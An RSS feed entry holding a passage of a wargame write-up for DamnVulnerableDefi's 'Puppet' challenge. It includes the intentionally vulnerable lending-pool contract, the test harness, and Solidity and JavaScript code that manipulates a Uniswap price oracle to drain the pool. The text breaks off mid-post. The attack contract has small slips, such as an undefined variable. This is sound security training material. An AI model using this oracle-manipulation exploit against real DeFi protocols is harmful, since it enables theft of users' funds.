@@ -1,0 +1,614 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>solidity on teddyctf</title>
+    <link>https://TheSavageTeddy.github.io/tags/solidity/</link>
+    <description>Recent content in solidity on teddyctf</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>teddyctf</copyright>
+    <lastBuildDate>Sun, 11 Feb 2024 09:30:00 +0800</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/tags/solidity/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Puppet Writeup - DamnVulnerableDefi V3</title>
+      <link>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</link>
+      <pubDate>Sun, 11 Feb 2024 09:30:00 +0800</pubDate>
+      
+      <guid>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</guid>
+      <description>This post contains the walkthrough and solutions for Puppet, a challenge from the DamnVulnerableDefi wargame, featuring a price oracle manipulation vulnerability.
+But wait, why another writeup? You may be wondering why I’m making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online don&amp;rsquo;t actually solve the challenge properly.
+There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (player) to only make 1 transaction total.</description>
+      <content>&lt;p&gt;This post contains the walkthrough and solutions for &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/challenges/puppet/&#34;&gt;Puppet&lt;/a&gt;, a challenge from the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz&#34;&gt;DamnVulnerableDefi&lt;/a&gt; wargame, featuring a price oracle manipulation vulnerability.&lt;/p&gt;
+&lt;h4 id=&#34;but-wait-why-another-writeup&#34;&gt;But wait, why another writeup?&lt;/h4&gt;
+&lt;p&gt;You may be wondering why I’m making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online &lt;strong&gt;don&amp;rsquo;t actually solve the challenge properly&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (&lt;code&gt;player&lt;/code&gt;) to only make 1 transaction total.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A lot of these online writeups didn&amp;rsquo;t account for this and hence made &lt;strong&gt;multiple transactions&lt;/strong&gt;. Their test script still shows that they passed the challenge, but this is because they might have simply created another account to run the attacks, or omitted &lt;code&gt;.connect(player)&lt;/code&gt; for some of the transactions, causing Hardhat to use the default account &lt;code&gt;deployer&lt;/code&gt;, both of which is not really solving the challenge properly.&lt;/p&gt;
+&lt;p&gt;Executing the entire exploit in 1 transaction resulted in the challenge being a bit trickier, which we will explore in this post.&lt;/p&gt;
+&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
+&lt;p&gt;Challenge Description:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+&lt;br&gt;
+&lt;br&gt;
+There’s a DVT market opened in an old &lt;a href=&#34;https://docs.uniswap.org/contracts/v1/overview&#34;&gt;Uniswap v1 exchange&lt;/a&gt;, currently with 10 ETH and 10 DVT in liquidity.
+&lt;br&gt;
+&lt;br&gt;
+Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We are given source code of the lending pool, the DVT, and the test file:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetPool.sol&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &amp;#34;@openzeppelin/contracts/security/ReentrancyGuard.sol&amp;#34;;
+import &amp;#34;@openzeppelin/contracts/utils/Address.sol&amp;#34;;
+import &amp;#34;../DamnValuableToken.sol&amp;#34;;
+
+/**
+ * @title PuppetPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract PuppetPool is ReentrancyGuard {
+    using Address for address payable;
+
+    uint256 public constant DEPOSIT_FACTOR = 2;
+
+    address public immutable uniswapPair;
+    DamnValuableToken public immutable token;
+
+    mapping(address =&amp;gt; uint256) public deposits;
+
+    error NotEnoughCollateral();
+    error TransferFailed();
+
+    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);
+
+    constructor(address tokenAddress, address uniswapPairAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapPair = uniswapPairAddress;
+    }
+
+    // Allows borrowing tokens by first depositing two times their value in ETH
+    function borrow(uint256 amount, address recipient) external payable nonReentrant {
+        uint256 depositRequired = calculateDepositRequired(amount);
+
+        if (msg.value &amp;lt; depositRequired)
+            revert NotEnoughCollateral();
+
+        if (msg.value &amp;gt; depositRequired) {
+            unchecked {
+                payable(msg.sender).sendValue(msg.value - depositRequired);
+            }
+        }
+
+        unchecked {
+            deposits[msg.sender] &amp;#43;= depositRequired;
+        }
+
+        // Fails if the pool doesn&amp;#39;t have enough tokens in liquidity
+        if(!token.transfer(recipient, amount))
+            revert TransferFailed();
+
+        emit Borrowed(msg.sender, recipient, depositRequired, amount);
+    }
+
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;100&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;100&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;DamnValuableToken.sol&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;;
+
+/**
+ * @title DamnValuableToken
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract DamnValuableToken is ERC20 {
+    constructor() ERC20(&amp;#34;DamnValuableToken&amp;#34;, &amp;#34;DVT&amp;#34;, 18) {
+        _mint(msg.sender, type(uint256).max);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
+const exchangeJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Exchange.json&amp;#34;);
+const factoryJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Factory.json&amp;#34;);
+
+const { ethers } = require(&amp;#39;hardhat&amp;#39;);
+const { expect } = require(&amp;#39;chai&amp;#39;);
+const { setBalance } = require(&amp;#34;@nomicfoundation/hardhat-network-helpers&amp;#34;);
+
+// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
+function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
+    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n &amp;#43; tokensSold * 997n);
+}
+
+describe(&amp;#39;[Challenge] Puppet&amp;#39;, function () {
+    let deployer, player;
+    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;
+
+    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
+    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;
+
+    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
+    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;
+
+    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        [deployer, player] = await ethers.getSigners();
+
+        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
+        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
+        
+        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
+
+        // Deploy token to be traded in Uniswap
+        token = await (await ethers.getContractFactory(&amp;#39;DamnValuableToken&amp;#39;, deployer)).deploy();
+
+        // Deploy a exchange that will be used as the factory template
+        exchangeTemplate = await UniswapExchangeFactory.deploy();
+
+        // Deploy factory, initializing it with the address of the template exchange
+        uniswapFactory = await UniswapFactoryFactory.deploy();
+        await uniswapFactory.initializeFactory(exchangeTemplate.address);
+
+        // Create a new exchange for the token, and retrieve the deployed exchange&amp;#39;s address
+        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
+        const { events } = await tx.wait();
+        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);
+
+        // Deploy the lending pool
+        lendingPool = await (await ethers.getContractFactory(&amp;#39;PuppetPool&amp;#39;, deployer)).deploy(
+            token.address,
+            uniswapExchange.address
+        );
+    
+        // Add initial token and ETH liquidity to the pool
+        await token.approve(
+            uniswapExchange.address,
+            UNISWAP_INITIAL_TOKEN_RESERVE
+        );
+        await uniswapExchange.addLiquidity(
+            0,                                                          // min_liquidity
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp * 2,   // deadline
+            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
+        );
+        
+        // Ensure Uniswap exchange is working as expected
+        expect(
+            await uniswapExchange.getTokenToEthInputPrice(
+                10n ** 18n,
+                { gasLimit: 1e6 }
+            )
+        ).to.be.eq(
+            calculateTokenToEthInputPrice(
+                10n ** 18n,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
+        );
+        
+        // Setup initial token balances of pool and player accounts
+        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
+
+        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
+        expect(
+            await lendingPool.calculateDepositRequired(10n ** 18n)
+        ).to.be.eq(2n * 10n ** 18n);
+
+        expect(
+            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
+    });
+
+    it(&amp;#39;Execution&amp;#39;, async function () {
+        /** CODE YOUR SOLUTION HERE */
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        // Player executed a single transaction
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        
+        // Player has taken all tokens from the pool       
+        expect(
+            await token.balanceOf(lendingPool.address)
+        ).to.be.eq(0, &amp;#39;Pool still has tokens&amp;#39;);
+
+        expect(
+            await token.balanceOf(player.address)
+        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, &amp;#39;Not enough token balance in player&amp;#39;);
+    });
+});
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Looking at the challenge description and source code, we can see that the target contract &lt;code&gt;PuppetPool&lt;/code&gt; has &lt;code&gt;100000&lt;/code&gt; DVTs (Damn Vulnerable Tokens) available for us to borrow. To borrow the DVTs, we need to provide 2 times the value in ETH as collateral. But how does the contract determine the value of DVT/ETH?&lt;/p&gt;
+&lt;p&gt;The function &lt;code&gt;calculateDepositRequired(uint256 amount)&lt;/code&gt; returns the amount of ETH required to borrow &lt;code&gt;amount&lt;/code&gt; tokens. This function calls &lt;code&gt;_computeOraclePrice()&lt;/code&gt; which queries a Uniswap V1 exchange with 10 ETH and 10 DVT in liquidity. We start with &lt;code&gt;25&lt;/code&gt; ETH and &lt;code&gt;1000&lt;/code&gt; DVTs.&lt;/p&gt;
+&lt;h1 id=&#34;price-oracle-manipulation&#34;&gt;Price Oracle Manipulation&lt;/h1&gt;
+&lt;p&gt;We have much more ETH and DVT than the Uniswap exchange, which we can abuse to manipulate the price of DVT/ETH. For example, if we exchange all &lt;code&gt;1000&lt;/code&gt; of our DVTs for ETH in the Uniswap exchange, it will drastically increase the supply of DVTs, and reduce the supply of ETH, inflating the price of ETH.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s say we swap &lt;code&gt;1000&lt;/code&gt; DVT for &lt;code&gt;9.9&lt;/code&gt; ETH. The Uniswap exchange will have &lt;code&gt;1010&lt;/code&gt; DVT and &lt;code&gt;0.1&lt;/code&gt; ETH left, and now reports a price of roughly &lt;code&gt;1&lt;/code&gt; ETH per &lt;code&gt;10100&lt;/code&gt; DVT. As the lending pool relies on this Uniswap exchange for the price of DVT, it will use this pricing for the collateral, and we can borrow &lt;code&gt;100000&lt;/code&gt; DVT for around &lt;code&gt;20&lt;/code&gt; ETH (providing 2 times ETH for collateral), draining the pool and solving the challenge.&lt;/p&gt;
+&lt;p&gt;We write a quick proof of concept to see this working in action:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;3&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
+it(&amp;#39;Execution&amp;#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    console.log(&amp;#34;=== Initial balances &amp;amp; prices ===&amp;#34;)
+    console.log(`ETH balance: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
+    console.log(`DVT balance: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
+    console.log(`Price of 1000 DVT: ${
+        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
+    } ETH`)
+    // approve uniswapExchange to use our DVTs
+    await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
+    // swap our DVTs for ETH
+    await uniswapExchange.connect(player).tokenToEthSwapInput(
+        PLAYER_INITIAL_TOKEN_BALANCE, // swapping 10000 DVTs
+        99n * 10n**17n, // for 9.9 ETH minimum
+        (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600 // deadline (not important)
+    )
+    console.log(&amp;#34;=== After manipulation ===&amp;#34;)
+    console.log(`ETH: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
+    console.log(`DVT: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
+    console.log(`Price of 1000 DVT: ${
+        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
+    } ETH`)
+
+});
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;img src=&#34;./img/poc.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;
+
+
+&lt;p&gt;&lt;em&gt;Small note: You can see I renamed the challenge &amp;lsquo;Puppet v1&amp;rsquo; as there are 2 other challenges named &amp;lsquo;Puppet&amp;rsquo; which also get ran if I use &lt;code&gt;--grep &#39;Puppet&#39;&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;As shown in the image, the price of DVT dropped significantly, allowing us to drain the lending pool with just 20 ETH (which we have enough of).&lt;/p&gt;
+&lt;p&gt;However, if we do borrow the &lt;code&gt;100000&lt;/code&gt; tokens and drain the lending pool, we still don&amp;rsquo;t pass the challenge, because as discussed before, everything needs to be done in exactly 1 transaction:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== Borrowing 100000 DVTs ===&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;calculateDepositRequired&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;borrow&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// amount of DVT to borrow
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// recipient of borrowed DVTs 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    {&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt;} &lt;span style=&#34;color:#75715e&#34;&gt;// send ETH as collateral
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Player DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Lending Pool DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;./img/fail.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;
+
+
+&lt;p&gt;Solve requirement which is not met:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;everything-in-one-transaction&#34;&gt;Everything in one transaction&lt;/h1&gt;
+&lt;p&gt;Everything should be done with only the &lt;code&gt;player&lt;/code&gt; account, so we shouldn&amp;rsquo;t create another account just to bypass this condition.&lt;/p&gt;
+&lt;p&gt;To perform all of these calls; swapping tokens with the Uniswap pool, then borrowing tokens from the lending pool, we can create a contract which &lt;strong&gt;executes everything in its constructor&lt;/strong&gt;, using our 1 transaction to deploy the contract, sending all necessary ether along with it.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
+contract PuppetAttack {
+    constructor (
+        address owner,
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapExchange uniswapExchange
+    ) payable {
+        // swap all our DVTs for ETH
+        token.approve(address(uniswapExchange), value);
+        uniswapExchange.tokenToEthSwapInput(
+            1000 * 10**18, // swap 1000 DVT
+            9.9 * 10**18, // for 9.9 ETH minimum
+            block.timestamp &amp;#43; 3600 // deadline (not important)
+        );
+
+        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
+        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
+        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
+            lendingPoolBalance
+        );
+        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;5&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
